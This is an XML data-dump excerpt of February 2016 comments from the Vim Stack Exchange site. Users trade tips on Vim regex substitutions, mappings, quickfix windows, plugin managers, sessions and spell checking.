  <row Id="10496" PostId="6583" Score="0" Text="If needed, my Vim config is here: https://github.com/rbnvrw/.dotfiles" CreationDate="2016-02-20T10:31:12.183" UserId="6514" />
  <row Id="10497" PostId="6580" Score="1" Text="Okay, I was a bit confused at first with all the `:` 's but your note reminded me that it could be used in place of `/` in order to avoid having to make all the other `/` 's into `\/` 's. And I didn't know how to run the macro _only_ on the lines that matched the condition. Thank you, @muru for the explanation. (Also, in my original question which I saw you edited, I thought that it was only &quot;code&quot; that should be put in the grey text box, so that's why I used quotes to refer to the `/c` pattern and the `/` character, but I'll remember to put these things in the grey text in the future.)" CreationDate="2016-02-20T10:39:34.443" UserId="6195" />
  <row Id="10498" PostId="6580" Score="1" Text="@ablewasiereisawelba it's important to note that even quotes could be meaningful - what happens if you needed to match `&quot;foo bar&quot;`, or use a register via `&quot;a`? Use code formatting for things that should displayed exactly as meant to be used." CreationDate="2016-02-20T10:48:17.117" UserId="205" />
  <row Id="10499" PostId="6582" Score="0" Text="Ok, so text object selection only works forwards. Thanks!" CreationDate="2016-02-20T11:21:26.597" UserId="6512" />
  <row Id="10500" PostId="6582" Score="4" Text="There are plugins (e.g. https://github.com/wellle/targets.vim) that work on objects &quot;behind&quot; or &quot;after&quot; the cursor ( *last* or *next* text-object), but I don't know about one that does what you are asking." CreationDate="2016-02-20T11:31:36.980" UserId="1800" />
  <row Id="10501" PostId="6584" Score="1" Text="Well, does it? :) I think you can ask the same thing about mappings then." CreationDate="2016-02-20T13:08:40.343" UserId="1800" />
  <row Id="10502" PostId="6584" Score="0" Text="@VanLaser Yeah, I guess you're right. I finally came out with another `InternalMethod`.. which finally seems like a pretty sane approach." CreationDate="2016-02-20T13:51:08.497" UserId="2978" />
  <row Id="10503" PostId="6586" Score="1" Text="Which makes perfect sense indeed ;)" CreationDate="2016-02-20T13:56:27.280" UserId="2978" />
  <row Id="10504" PostId="6588" Score="0" Text="I cannot reproduce this using Vim 7.4.1294/netrw 154. Have you set `autochdir` or used a plugin which does something similar?" CreationDate="2016-02-20T18:08:30.370" UserId="205" />
  <row Id="10505" PostId="6589" Score="4" Text="Does every `Hide` block have a `SetFontSize` line (whatever be the value)? If so, you could use `:%s/Hide\_.\{-\}SetFontSize \zs28/18/`" CreationDate="2016-02-20T18:32:39.320" UserId="205" />
  <row Id="10506" PostId="6588" Score="0" Text="Perhaps! This could be my fault. Let me check that...  So yes, I do have that set, but why does that matter? I want that set because I want vim's current directory to reflect the buffer I am in right now, and if I have two buffers open, I want the current directory to switch as I switch buffers. So with that turned on vim has to perform symlink resolution? Aren't there better ways for vim to get the path it was launched from?" CreationDate="2016-02-20T18:34:39.207" UserId="6519" />
  <row Id="10507" PostId="6588" Score="0" Text="Here's a test that you might find interesting. In a shell, run `ls ~/nested/..`. Is the output what you expected?" CreationDate="2016-02-20T18:52:14.663" UserId="205" />
  <row Id="10508" PostId="6590" Score="1" Text="This solves indeed the problem of unintended command executions. Concerning your example with `va`, sending just `&lt;c-c&gt;` first, followed by `&lt;c-c&gt;KEYS` puts Vim back to Normal mode and interpret `KEYS` as expected." CreationDate="2016-02-20T20:15:31.943" UserId="6517" />
  <row Id="10509" PostId="6588" Score="0" Text="You are right, the output is not according to my ideal and not according to the way the command line behaves when you navigate into a symlinked directory, in which case you see no sign of a different path. I believe there are ways that vim can get the &quot;correct&quot; path in this situation. I have done it myself when creating bash scripts. If I use `readlink` for example I do *not* get the result I want. I imagine this is what vim is doing and perhaps it needs to do something different..." CreationDate="2016-02-20T21:18:29.347" UserId="6519" />
  <row Id="10510" PostId="6588" Score="0" Text="Related: http://stackoverflow.com/a/10456866/2072269" CreationDate="2016-02-20T21:26:12.817" UserId="205" />
  <row Id="10511" PostId="6588" Score="0" Text="Damn, I thought I found a hint [here](http://inlehmansterms.net/2014/09/04/sane-vim-working-directories/), where it discusses `netrw_keepdir`, but I tried toggling that one both ways and it didn't help..." CreationDate="2016-02-20T21:37:51.003" UserId="6519" />
  <row Id="10512" PostId="6591" Score="0" Text="Well, why not? :) But how do you actually define them &quot;in the function scope where you use them&quot;? i.e. is there any actual difference in how the command is defined? (similar to `s:function()` for functions)." CreationDate="2016-02-20T22:33:44.950" UserId="1800" />
  <row Id="10513" PostId="6591" Score="0" Text="I suppose, if you source the file manually, you get all those commands defined, but if the user loads the plugin, the commands get deleted automatically - that's nice :) (upvoted)" CreationDate="2016-02-20T22:40:22.093" UserId="1800" />
  <row Id="10514" PostId="6142" Score="0" Text="Does increasing the `minlines` setting for your current syntax highlighting help? I.e, `:syn sync minlines=800` (adjust as needed)." CreationDate="2016-02-20T23:12:30.163" UserId="6523" />
  <row Id="10515" PostId="6591" Score="0" Text="Everything is as usual. I just don't forget to call `delcommand` when I'm done. Check for instance the `s:help()` function [over there](https://github.com/LucHermitte/mu-template/blob/master/after/plugin/mu-template.vim#L675)" CreationDate="2016-02-20T23:23:04.637" UserId="626" />
  <row Id="10516" PostId="6544" Score="0" Text="You probably have some settings in your vimrc that affect the regular expression search. Try it again starting Vim with `vim -u NONE`. I've just done that and this works perfectly! In fact, there's no way the search would match the first 1 because it requires a preceding slash." CreationDate="2016-02-20T23:44:57.760" UserId="599" />
  <row Id="10517" PostId="6598" Score="4" Text="A good place to start looking would be the docs.  The quickfix window is not supposed to open automatically.  Some plugins might do that, but plain Vim is not supposed to do it." CreationDate="2016-02-21T09:19:06.127" UserId="2313" />
  <row Id="10518" PostId="601" Score="0" Text="There's another plugin for this that the author of my suggested plugin describes as &quot;a much improved reworking of my own dragvisuals.vim&quot;: https://github.com/zirrostig/vim-schlepp" CreationDate="2016-02-21T11:29:17.250" UserId="411" />
  <row Id="10519" PostId="6524" Score="0" Text="Yes, it does, but not in the GUI. Any help here?" CreationDate="2016-02-21T12:49:34.150" UserId="5919" />
  <row Id="10520" PostId="6594" Score="0" Text="That seems like a very good workaround, thank you. The only nuisance that remains is that this will also close split windows when that buffer is wiped, but I can live with that." CreationDate="2016-02-21T14:11:14.723" UserId="6523" />
  <row Id="10521" PostId="6524" Score="0" Text="What do you mean, not in the GUI? Please be very specific. Perhaps you have a typo somewhere?" CreationDate="2016-02-21T14:46:18.770" UserId="71" />
  <row Id="10522" PostId="6524" Score="0" Text="I copied what you had in your answer to my .vimrc. When I start GVIM, I see the buttons, but they do not do anything. If I type what you gave in the the &quot;:&quot; prompt, it works. Could it be the &lt;CR&gt;?" CreationDate="2016-02-21T18:00:24.427" UserId="5919" />
  <row Id="10523" PostId="6601" Score="0" Text="Why ask random strangers when you can read their documentation and decide for yourself?" CreationDate="2016-02-21T20:02:19.680" UserId="54" />
  <row Id="10524" PostId="6601" Score="0" Text="@romainl You could apply that logic to any question asked anywhere on here. I did look through the documentation for some plugin managers. So far I have not found what I want. I am seeing if anybody knows of a manager that will satisfy my needs." CreationDate="2016-02-21T20:23:45.090" UserId="1410" />
  <row Id="10525" PostId="6601" Score="1" Text="Indeed, good, well researched, questions are not really the hallmark of this site." CreationDate="2016-02-21T21:10:00.403" UserId="54" />
  <row Id="10526" PostId="6604" Score="0" Text="Change system PATH to have your custom python path *before* the default one?" CreationDate="2016-02-21T22:30:37.317" UserId="1800" />
  <row Id="10527" PostId="2403" Score="0" Text="Since a couple of weeks, YCM does support Python3 autocompletion, see my answer: http://vi.stackexchange.com/a/6605/3282" CreationDate="2016-02-21T23:52:45.280" UserId="3282" />
  <row Id="10530" PostId="6601" Score="3" Text="[`vim-plug`'s  README](https://github.com/junegunn/vim-plug) says you can specify tags. Another way would be to setup a script that gets the latest tag and does a `git checkout` on it (using http://stackoverflow.com/questions/1404796/how-to-get-the-latest-tag-name-in-current-branch-in-git), and using it as a post-update script in `vim-plug`." CreationDate="2016-02-22T10:36:00.350" UserId="205" />
  <row Id="10531" PostId="6608" Score="0" Text="+1 for the nice animated gif :) Just curious, what do you used to display the typed keys?" CreationDate="2016-02-22T11:25:01.223" UserId="1405" />
  <row Id="10532" PostId="6608" Score="0" Text="@mMontu: I used screenkey to display the keys and gtk-recordmydesktop to record it (both in Debian repos). With 5fps a 45 seconds clips is less than a MiB. Then converted it online to a gif (that is where the distortions came in, before the picture quality was perfect)." CreationDate="2016-02-22T12:48:12.833" UserId="3282" />
  <row Id="10533" PostId="3365" Score="0" Text="Do these definitively work for you? Vim doesn't seem to want me to remap `gf` to something else. Even `nnoremap gf :echo &quot;hello&quot;&lt;CR&gt;` _still_ opens the file under cursor in a new buffer (and yes, I sourced vimrc)." CreationDate="2016-02-22T14:35:12.490" UserId="6533" />
  <row Id="10534" PostId="3365" Score="0" Text="Ah, nevermind - I have a plugin interfering." CreationDate="2016-02-22T15:05:31.027" UserId="6533" />
  <row Id="10535" PostId="6601" Score="0" Text="@muru Good idea! I will have to try that." CreationDate="2016-02-22T15:40:23.853" UserId="1410" />
  <row Id="10536" PostId="6598" Score="0" Text="@SatoKatsura, I had looked at the docs, but it never said that it wouldn't open automatically. Do you know of a way to force the quickfix window to open automatically whenever it's been &quot;created&quot;? I want to add something helpful to my vimrc." CreationDate="2016-02-22T16:12:39.550" UserId="2062" />
  <row Id="10537" PostId="6609" Score="0" Text="I am trying to make vimgrep open the quickfix window (I'm not using the quickfix window in a compilation/make environment). I've been using :copen to do this. On a sidenote, after looking at the documentation for :copen and :cwindow I don't understand the difference between them. Do you know the difference?" CreationDate="2016-02-22T16:21:37.173" UserId="2062" />
  <row Id="10538" PostId="6609" Score="0" Text="`:copen` always open the qf-window. `:cwindow` only opens it when there are recognized errors. If a program compiles, then there won't be any error, and then, `:cwindow` won't do anything." CreationDate="2016-02-22T16:48:45.947" UserId="626" />
  <row Id="10539" PostId="6609" Score="0" Text="Okay, but there are other cases, besides compilation, when a quickfix (like ``:vimgrep``) should be opened. Is there a way to make the quickfix always open as soon as there is information to show in the quickfix window (i.e. after ``:make`` or ``:vimgrep``)? The ``:vimgrep /something/ *.bar`` followed by ``:copen`` pattern is getting old." CreationDate="2016-02-22T16:56:18.270" UserId="2062" />
  <row Id="10540" PostId="6609" Score="0" Text="I'm afraid it's not possible. May be, you could listen to `QuickFixCmdPost` event and force the `:copen`, but I'm not sure it's free from any side effect." CreationDate="2016-02-22T17:04:08.010" UserId="626" />
  <row Id="10541" PostId="6609" Score="0" Text="Okay, that's okay. Thanks Luc, for the heads up about your plugin. I'll include it in case I end up compiling in the future." CreationDate="2016-02-22T17:07:19.203" UserId="2062" />
  <row Id="10542" PostId="550" Score="0" Text="Can anyone comment on why tpope in the pathogen readme might say why submodules are not the way to go? I don't know submodules either (and my solution works great for me without even a plugin manager) but I'm guessing the anti-submodule crowd has something interesting to say." CreationDate="2016-02-22T18:11:45.400" UserId="6430" />
  <row Id="10543" PostId="4849" Score="1" Text="Single quotes don't do any expansion, double quotes do. See `:h expr-string` vs the immediately following `:h literal-string`. Most notably, backslashes don't mean anything special in single-quote strings. But then this means that all of the escapes don't do anything either; use double quotes to get magic things to happen. (Single quoted strings are great for regexes, for example.)" CreationDate="2016-02-22T18:16:14.703" UserId="6430" />
  <row Id="10544" PostId="4849" Score="0" Text="@flashburn If you got a differently colored `&lt;F7&gt;` in your buffer then you probably did it right. Ctrl-V, release both keys, *then* F7." CreationDate="2016-02-22T18:18:03.510" UserId="6430" />
  <row Id="10545" PostId="6615" Score="7" Text="`call` calls a function, `execute` executes an `ex` command." CreationDate="2016-02-22T18:49:19.713" UserId="2313" />
  <row Id="10546" PostId="6615" Score="0" Text="Can you please elaborate and make this into an answer? Credit where credit is due." CreationDate="2016-02-22T19:13:42.527" UserId="5919" />
  <row Id="10548" PostId="6620" Score="0" Text="If you want to try the `set` version out though, just remove the quotes from the one in the OP. You'll still need the backslashes before the spaces though." CreationDate="2016-02-22T19:23:55.643" UserId="6430" />
  <row Id="10549" PostId="6615" Score="1" Text="I try to avoid posting answers these days, because I disagree with SE's new licence policy.  As for `call` vs. `execute`, you can get more information from the manual: `:h call()`, `:h :exe`." CreationDate="2016-02-22T19:28:00.380" UserId="2313" />
  <row Id="10552" PostId="6622" Score="1" Text="What do you mean when you say the function doesn't work? What happens? Four things that occur to me: 1) you can only use the map from visual mode, because you create no mappings for other modes, 2) calling the function from visual mode, you may want to do `execute &quot;normal V:!say&quot;`, or else escape visual mode before the second `execute`, because in visual mode, `'&lt;` moves to beginning of the _last_ visual selection, not the current, 3) `normal V` will select a line, not a paragraph–consider `vip`, and 4) the irony of `&quot;silent ... !say&quot;` ;)" CreationDate="2016-02-22T20:25:49.690" UserId="1306" />
  <row Id="10553" PostId="6622" Score="2" Text="I know it doesn't answer your question, but I think Vim automatically puts the marks `'{` and `'}` around the current paragraph, so if you define the mapping `nnoremap &lt;silent&gt; &lt;leader&gt;v :&lt;C-U&gt;silent! '{,'}w !say&lt;CR&gt;` and hit `&lt;leader&gt;v` in normal mode, the contents of the current paragraph should be written on the standard input of the `say` program." CreationDate="2016-02-22T20:26:57.813" UserId="4939" />
  <row Id="10554" PostId="6624" Score="0" Text="Thank you. I keep learning great stuff here. This function works, but with some unexpected results. It seems to select, randomly the previous or the current paragraph." CreationDate="2016-02-22T20:49:25.353" UserId="1095" />
  <row Id="10555" PostId="6624" Score="1" Text="Paragraphs are demarcated by blank lines, so if you have spaces on lines in between paragraphs they'll be treated as if there isn't a paragraph break. Otherwise I'm not familiar with what you're reporting, `ip` should select the containing paragraph if you're in one and the next paragraph if you aren't in one." CreationDate="2016-02-22T20:51:20.840" UserId="6430" />
  <row Id="10556" PostId="6622" Score="0" Text="jjaderberg, you are right, one of the issues was the mapping. Yes, what an irony `silent ... !say`. saginaw, thank you very much. This solution worked great without the need of a function." CreationDate="2016-02-22T20:53:44.673" UserId="1095" />
  <row Id="10557" PostId="6627" Score="2" Text="Does `:set filetype=markdown` help or is the filetype already set correctly?" CreationDate="2016-02-22T22:11:04.963" UserId="3282" />
  <row Id="10558" PostId="6627" Score="0" Text="@cbaumhardt, sorry, I should have mentioned: I tried both `set filetype=markdown` and `set syntax=markdown` and neither made any difference." CreationDate="2016-02-22T22:54:28.780" UserId="4676" />
  <row Id="10559" PostId="6627" Score="2" Text="When I start my Vim 7.4 without my vimrc (`vim -Nu NONE`), write a small markdown example, enter `:set filetype=markdown` and `:syntax on` it works for me. Do you have syntax enabled? Are you using an old Vim version?" CreationDate="2016-02-22T23:23:31.257" UserId="3282" />
  <row Id="10560" PostId="6615" Score="0" Text="@SatoKatsura wasn't the policy change postponed? And doesn't the new policy only affect code? I'd say your answer wouldn't have much code in it in this case?" CreationDate="2016-02-23T00:21:34.980" UserId="205" />
  <row Id="10561" PostId="6631" Score="2" Text="The Perl way would be to use `(?&lt;group-num&gt;)`. Looking through `:h regex`, there's no Vim equivalent. How are you using this pattern? You could build it from variables, depending on how you use it." CreationDate="2016-02-23T01:17:47.910" UserId="205" />
  <row Id="10562" PostId="6627" Score="1" Text="@cbaumhardt, I'm using 7.3.646.  I confirmed that doing what your comment suggested worked, and doing the same without the `-Nu NONE` did not work.  My `~/.vimrc` includes [these lines](https://github.com/atsaloli/cf3-tutorial/blob/b5ef5f9a4926d102cd04636b86c9f06464636f35/source/100-180-Installing_Syntax_Highlighter-0265-Install_Vim_Plugin.sh#L10-L45) for editing CFEngine files, then at the bottom I have `set smartindent`, `filetype plugin indent on`, `syntax on` which may be redundant but I was trying to get something else to work...any of these look like a likely culprit?" CreationDate="2016-02-23T02:03:33.997" UserId="4676" />
  <row Id="10563" PostId="6633" Score="0" Text="&quot;It fails&quot; is not a very detailed problem description... The second and third for (`call ...AirlineTheme` and `set AirlineTheme`) are invalid, so what error do you get when you try the first one?" CreationDate="2016-02-23T02:04:40.613" UserId="51" />
  <row Id="10564" PostId="6627" Score="0" Text="Does `:syntax on` have no effect? At least you now know that it is related to your `.vimrc`. You can try to comment out blocks of code to figure out what causes this behaviour. The lines you linked don't look relevant to me." CreationDate="2016-02-23T02:12:34.787" UserId="3282" />
  <row Id="10565" PostId="6629" Score="2" Text="Perhaps this answer helps? http://stackoverflow.com/a/21389290/5260921" CreationDate="2016-02-23T02:15:36.757" UserId="3282" />
  <row Id="10566" PostId="6633" Score="0" Text="Have you installed the base16 theme? See [this FAQ entry](https://github.com/vim-airline/vim-airline/wiki/FAQ#the-themes-are-missing)." CreationDate="2016-02-23T02:23:15.420" UserId="205" />
  <row Id="10567" PostId="6629" Score="0" Text="It helps.. Though the answers make me sad.. :'-|" CreationDate="2016-02-23T02:31:39.930" UserId="6542" />
  <row Id="10568" PostId="6634" Score="0" Text="Just an FYI: [What you think you get with ``` is not necessarily what you get.](http://meta.stackexchange.com/q/125148/270345)" CreationDate="2016-02-23T02:41:55.277" UserId="205" />
  <row Id="10569" PostId="6634" Score="0" Text="Functionally, what was the difference between the two format-stylings used here? For a one liner, the difference is minimal" CreationDate="2016-02-23T02:55:23.343" UserId="4932" />
  <row Id="10570" PostId="6629" Score="0" Text="I understand, I have been there too :( I settled to use QWERTY instead of QWERTZ layout, which has many benefits for programming..." CreationDate="2016-02-23T02:56:13.757" UserId="3282" />
  <row Id="10571" PostId="6634" Score="0" Text="Functionally, right now, no difference. If we ever get syntax highlighting for Vim, it would make a difference." CreationDate="2016-02-23T02:56:40.227" UserId="205" />
  <row Id="10572" PostId="6629" Score="0" Text="How do you write umlauts with qwerty then?" CreationDate="2016-02-23T06:16:13.043" UserId="6542" />
  <row Id="10573" PostId="6636" Score="1" Text="Thanks for the reply. It works for removing the ending dashes. But is it possible to also remove the extra background highlighting after 80 chars ?" CreationDate="2016-02-23T07:52:39.243" UserId="6550" />
  <row Id="10574" PostId="6631" Score="0" Text="@muru, how can I reference variables in a `/` search? if I `:let pat = &quot;testpattern&quot;` and `/pat()`, vim searches for &quot;pat()&quot;, not &quot;testpattern&quot;." CreationDate="2016-02-23T07:54:04.227" UserId="4505" />
  <row Id="10575" PostId="6631" Score="0" Text="I am using the pattern to enclose Greek passages in `\gr{…}`. `:%s//\1\\gr{\2}\3`. I need to improve it to include cases where a line begins or ends with Greek, and maybe where Gr. spans over a few lines." CreationDate="2016-02-23T07:58:09.730" UserId="4505" />
  <row Id="10577" PostId="6615" Score="1" Text="@muru The fact that this issue exists to begin with is ample proof that some level of mutual trust between SE and regular posters needs to be re-established.  In my book, the way the issue was handled by SE is not conductive to that.  I don't know about you, but posting to SE is not exactly the goal of my life.  I'd say SE needs reasonably qualified posters, rather than the other way around. _shrug_" CreationDate="2016-02-23T09:42:16.403" UserId="2313" />
  <row Id="10578" PostId="6636" Score="1" Text="No, I don't think that's possible. :\" CreationDate="2016-02-23T09:59:11.700" UserId="21" />
  <row Id="10579" PostId="6629" Score="1" Text="[faq1](https://vimhelp.appspot.com/vim_faq.txt.html#faq-20.5) and [faq2](https://vimhelp.appspot.com/vim_faq.txt.html#faq-20.4)" CreationDate="2016-02-23T10:55:04.827" UserId="71" />
  <row Id="10580" PostId="6640" Score="0" Text="My account is set as the Admin but `:w!` is not working. It says can't open file for reading. Though i can do the exact same thing outside of vim." CreationDate="2016-02-23T12:17:40.187" UserId="5481" />
  <row Id="10581" PostId="3509" Score="0" Text="I want to find more information on this plugin. How do you use it? Do I need ctags for it?" CreationDate="2016-02-23T12:21:37.907" UserId="2710" />
  <row Id="10583" PostId="6629" Score="0" Text="@le0m, inside Vim I use digraphs (in insert mode press Ctrl + K, then e.g. o:), and inside regular Linux environment for writing mails or so I use a keyboard shortcut (GNOME compose key)" CreationDate="2016-02-23T12:46:14.090" UserId="3282" />
  <row Id="10585" PostId="6613" Score="1" Text="Please reread the question. It states pretty clearly that IT IS NOT INTENDED for beginners. To the contrary, it is for veteran, fluent users, who do not understand the programming language. Oh, well." CreationDate="2016-02-23T13:10:38.373" UserId="5919" />
  <row Id="10586" PostId="6617" Score="0" Text="Indeed! This is what VI users who want to become vi programmers should read." CreationDate="2016-02-23T13:11:08.827" UserId="5919" />
  <row Id="10587" PostId="6631" Score="0" Text="I seem to recall that Vim doesn't support ranges for multibyte characters.  I may be wrong though; perhaps ask on `vim_dev`." CreationDate="2016-02-23T15:17:12.000" UserId="2313" />
  <row Id="10589" PostId="6631" Score="0" Text="@SatoKatsura, I read that too, but it does work." CreationDate="2016-02-23T15:55:47.683" UserId="4505" />
  <row Id="10590" PostId="6642" Score="0" Text="Interesting, but now in these cases, note I am not suspending the VM due to anything happening in Vim/GVim. I am suspending just because of some outside factor, like &quot;I need to reboot the whole computer.&quot; The nice thing about VMs is that you can suspend them, reboot the entire computer, and pick up exactly where you left off after the reboot once you start up the VM again. Another &quot;outside factor&quot; might be, &quot;I need to temporarily get rid of this VM because it's eating 6 GB of my memory, and I now need to run this other hog of a VM that also wants 6 GB, and I only have 12 GB.&quot;" CreationDate="2016-02-23T16:07:33.400" UserId="6519" />
  <row Id="10591" PostId="6642" Score="0" Text="@user62177541 I understand that you aren't closing the VM because of Vim; it was just a suggestion, because I've faced some weird issues after pausing/resuming VMs. Anyway, did you have the chance to try the `:RestartVim` command?" CreationDate="2016-02-23T16:29:13.373" UserId="1405" />
  <row Id="10592" PostId="6642" Score="0" Text="Evaluating it; I don't install plugins into Vim lightly. One issue with it is new dialogs that I do not want and I do not follow a &quot;default editing session&quot; model at all. I always have at least a bunch of sessions, with very different purposes. Do you know how I get rid of this &quot;default session&quot; business? The one session per &quot;--servername&quot; model is kind of OK with me, as long as everything does not *have to* have a servername." CreationDate="2016-02-23T16:36:07.427" UserId="6519" />
  <row Id="10593" PostId="6642" Score="0" Text="@user62177541 check the `g:session_autoload` option." CreationDate="2016-02-23T16:57:50.357" UserId="1405" />
  <row Id="10594" PostId="6642" Score="0" Text="On this subject, `:mksession` is a new one for me that involves no plugins too. That might seem to do what you're talking about better than the plugin, since this is only in these limited situations where I may want this." CreationDate="2016-02-23T17:13:54.680" UserId="6519" />
  <row Id="10595" PostId="6642" Score="0" Text="@user62177541 this is actually what I meant on the first paragraph of my answer. The plugin is helpful to provide a simple mechanism to make it easier, as mentioned on the last paragraph, by providing a simple command, instead of manually executing the following four steps: save the session (with `:mksession`), close Vim, open Vim, and load the session. The plugin can be configured to do nothing automatically, so it would only provide the `:RestartVim`. But that is only an improvement for lazy people (like myself)." CreationDate="2016-02-23T17:23:06.923" UserId="1405" />
  <row Id="10596" PostId="6642" Score="0" Text="@user62177541 ` I am not suspending the VM due to anything happening in Vim/GVim` - on the first paragraph of the answer I meant that you don't have to suspend the VM in order to save the state, at least for Vim -- you could use sessions for that. Thus you could also use it on your host machine." CreationDate="2016-02-23T17:28:09.900" UserId="1405" />
  <row Id="10598" PostId="6645" Score="3" Text="I don't see this problem with `'spelllang'` set to `en`, unless it is clearly wrong, e.g.: `dog's` is displayed without any mark, while `the's` is marked as an error. Can you please provide a example and the value of  `'spelllang'` you are using?" CreationDate="2016-02-23T17:55:19.760" UserId="1405" />
  <row Id="10599" PostId="63" Score="0" Text="I found this eBook by Swaroop C H, very useful: http://files.swaroopch.com/vim/byte_of_vim_v051.pdf" CreationDate="2016-02-23T00:00:46.343" UserId="6470" />
  <row Id="10600" PostId="3509" Score="0" Text="@NeaţuOvidiuGabriel: this plugin is built into Vim, you don't need anything other than what my answer tells you." CreationDate="2016-02-23T18:45:12.147" UserId="246" />
  <row Id="10601" PostId="6631" Score="0" Text="It work in _some_ situations.  The effect is undefined in others, f.i. Vim might crash after a while.  I think one of the problematic situations is when the bounds of a range are more than 256 apart (actually when their byte representations differ in more than the last byte).  It actually makes sense if you think of it for a moment.  Still, it might no longer crash in recent versions..." CreationDate="2016-02-23T19:31:51.847" UserId="2313" />
  <row Id="10602" PostId="6645" Score="0" Text="@mMontu, Sorry, I see now that it is only a problem with some words. Examples: `potential's`, `something's`." CreationDate="2016-02-23T20:25:55.440" UserId="4505" />
  <row Id="10603" PostId="6604" Score="0" Text="That is already the case." CreationDate="2016-02-23T21:54:06.043" UserId="5328" />
  <row Id="10604" PostId="6476" Score="0" Text="Thanks, I'm actually using the `vimtex` plugin which is in active development and provides a lot of nice TeX features. You might check it out." CreationDate="2016-02-23T22:42:11.330" UserId="2062" />
  <row Id="10605" PostId="6647" Score="0" Text="This seems to work! Trying it right now (just buffer by buffer rather than with `:bufdo`). Also, this gives the ideal behavior I was referring to where I do not even lose undo history! Question though, if I want to do this buffer by buffer as I'm describing I'm doing is it technically best to do `:set noswapfile swapfile` in order to not affect other buffers or should I be restricting it some way." CreationDate="2016-02-24T00:55:44.597" UserId="6519" />
  <row Id="10606" PostId="6648" Score="2" Text="Have you tried http://unix.stackexchange.com/q/41493/70524 / http://askubuntu.com/a/311454/158442?" CreationDate="2016-02-24T03:16:00.550" UserId="205" />
  <row Id="10607" PostId="6647" Score="0" Text="I think that is a good way to do it." CreationDate="2016-02-24T07:10:39.643" UserId="71" />
  <row Id="10608" PostId="6649" Score="3" Text="You might be interested by [this answer](http://stackoverflow.com/a/16110145/4194289). It is about MacVim but I think it is also relevant for gVim with windows." CreationDate="2016-02-24T08:39:59.420" UserId="1841" />
  <row Id="10610" PostId="6646" Score="2" Text="Looking at it from another perspective: vimscript only runs *commands*. There's no way to directly run a function. You can use the `call` command if you want to discard the return value, `echo` if you want up print it, `let` if you want to save it, but you *have* to use a command." CreationDate="2016-02-24T08:58:15.020" UserId="205" />
  <row Id="10611" PostId="4576" Score="0" Text="Interesting [crosslink](http://stackoverflow.com/a/14804361/3719101)? ;)" CreationDate="2016-02-24T09:02:41.350" UserId="2978" />
  <row Id="10612" PostId="6640" Score="0" Text="@DurgaSwaroop: Have you tried opening `gvim` as `Run as Administrator`? Perhaps it would solve your purpose... or otherwise it might be possible that the file is being locked by another application..." CreationDate="2016-02-24T09:30:40.810" UserId="5912" />
  <row Id="10613" PostId="6640" Score="0" Text="@Cylian,  Yeah, That would obviously work. But, When i didn't open as administrator and am editing a system file, there should be a way to still save the file, like the way its possible in Linux." CreationDate="2016-02-24T09:33:25.793" UserId="5481" />
  <row Id="10614" PostId="6638" Score="0" Text="Does this work on windows properly? &#xA;In the Readme file it says it probably won't." CreationDate="2016-02-24T09:37:05.097" UserId="5481" />
  <row Id="10615" PostId="6640" Score="0" Text="@DurgaSwaroop: The parent process must be `run as administrator` to complete its sub-process involving administrative tasks to do... Please have a look at http://windows.microsoft.com/en-in/windows/what-is-user-account-control#1TC=windows-7 .... otherwise disable `UAC` settings...." CreationDate="2016-02-24T09:38:20.520" UserId="5912" />
  <row Id="10616" PostId="6650" Score="5" Text="(1) Don't use both pathogen and Vundle.  (2) Don't put comments at end of lines.  As for your question, well, you'd stand better chances to get a meaningful answers if you'd find some way to reproduce the problem reliably." CreationDate="2016-02-24T10:29:01.107" UserId="2313" />
  <row Id="10617" PostId="6650" Score="5" Text="I'm voting to close this question as off-topic because the problem can't be reproduced." CreationDate="2016-02-24T10:30:14.623" UserId="2313" />
  <row Id="10618" PostId="6652" Score="0" Text="Thanks for this version with the plugin. Not sure I will mapping `D` but like your version." CreationDate="2016-02-24T10:50:30.927" UserId="3357" />
  <row Id="10619" PostId="6653" Score="0" Text="Thanks for your version Romain. Love it" CreationDate="2016-02-24T10:50:52.670" UserId="3357" />
  <row Id="10620" PostId="6654" Score="0" Text="Definitely love the macro version because this is something I do often. Thanks a lot." CreationDate="2016-02-24T10:51:25.347" UserId="3357" />
  <row Id="10621" PostId="6654" Score="1" Text="I'm glad you liked it. There just an important point with this macro version: as it relies on the content of the search register, you might have to check that the register still contains `{` and not something else if you've been doing other stuff between to uses of the macro." CreationDate="2016-02-24T10:55:33.357" UserId="1841" />
  <row Id="10622" PostId="6648" Score="1" Text="I think you can also setup a ssh tunnel on your local machine with something like: `ssh -fNp 22 username@machine1 -L 2844/machine2/22`; you can then use `ssh -p 2844 localhost` to ssh to machine2  (it's been years since I did this, so the command may not be 100% correct). In any case, this looks like a `ssh` question, and not really a Vim question." CreationDate="2016-02-24T11:40:12.960" UserId="51" />
  <row Id="10623" PostId="6648" Score="2" Text="I'm voting to close this question as off-topic because it is not about Vim, but about `ssh`." CreationDate="2016-02-24T11:40:32.103" UserId="51" />
  <row Id="10624" PostId="6652" Score="1" Text="Thanks! Of course, mappings are something personal, that was only an example to express the idea. ;-) Make yourself familiar with 'mapleader', if you haven't already!" CreationDate="2016-02-24T11:44:11.767" UserId="6495" />
  <row Id="10625" PostId="6655" Score="1" Text="I was hoping for something less cumbersome.  Would it not be possible to make the spell checker treat the apostrophe as a word boundary?  Even if there should be any word that could not be put into the genetive, I don't see much danger of doing it by mistype." CreationDate="2016-02-24T14:04:52.870" UserId="4505" />
  <row Id="10626" PostId="6439" Score="0" Text="Didn't quite test the solution, but accepted it because of the completeness. Instead I used the suggest workaround: [YouCompleteMe](https://github.com/Valloric/YouCompleteMe) instead of ctrl+x, ctrl+f." CreationDate="2016-02-24T14:11:46.713" UserId="6375" />
  <row Id="10627" PostId="6655" Score="1" Text="@Lawrence Not easily as far as I can see. See the &quot;WORDS&quot; section in [`:help spell`](http://vimhelp.appspot.com/spell.txt.html#spell). You can *probably* hack the binary .spl file, but adding a few words to a spellfile is probably easier..." CreationDate="2016-02-24T14:35:59.630" UserId="51" />
  <row Id="10628" PostId="6658" Score="0" Text="&quot;that seems to irretrievably break the custom ftplugin functionality.&quot; &lt;- In what way?" CreationDate="2016-02-24T14:44:26.587" UserId="343" />
  <row Id="10630" PostId="6658" Score="1" Text="To install xmledit with Vundle, you should just need to add the line `Plugin 'sukima/xmledit'` to your .vimrc. Does that not work?" CreationDate="2016-02-24T15:15:24.273" UserId="343" />
  <row Id="10631" PostId="6660" Score="3" Text="Have to read [`:h autoread`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27autoread%27)? Is that what you're looking for?" CreationDate="2016-02-24T16:32:44.570" UserId="1841" />
